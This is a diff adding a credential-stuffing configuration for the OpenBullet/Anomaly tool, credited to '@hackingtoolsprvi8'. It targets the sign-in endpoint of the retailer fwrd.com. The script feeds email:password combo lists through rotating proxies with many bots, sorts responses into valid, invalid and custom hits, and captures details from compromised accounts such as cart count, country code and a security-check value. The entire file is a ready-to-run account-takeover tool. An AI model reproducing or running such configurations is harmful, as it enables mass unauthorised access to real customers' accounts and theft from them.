@@ -1,0 +1,90 @@
+[SETTINGS]
+{
+  "Name": "Fwrd(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-18T11:44:39.6139069+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.fwrd.com/r/ajax/SignIn.jsp" EncodeContent=TRUE 
+  CONTENT "email=<USER>&pw=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 140" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: www.fwrd.com" 
+  HEADER "Origin: https://www.fwrd.com" 
+  HEADER "Referer: https://www.fwrd.com/fw/Login.jsp?page=https%3A%2F%2Fwww.fwrd.com%2Ffw%2Findex.jsp&sectionURL=Direct+Hit" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "checkedPage" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Invalid password" 
+  KEYCHAIN Failure OR 
+    KEY "We cannot find an account for that email address" 
+  KEYCHAIN Failure OR 
+    KEY "Please enter a valid e-mail address" 
+
+PARSE "<SOURCE>" LR "heartItemCount\":\"" "\",\"" -> CAP "heartItemCount" 
+
+PARSE "<SOURCE>" LR "cartCount\":\"" "\",\"" -> CAP "cartCount" 
+
+PARSE "<SOURCE>" LR "countryCode\":\"" "\"," -> CAP "countryCode" 
+
+PARSE "<SOURCE>" LR "mergedItemFound\":\"" "\",\"" -> CAP "mergedItemFound" 
+
+PARSE "<SOURCE>" LR "securityCheck\":\"" "\"}" -> CAP "securityCheck" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
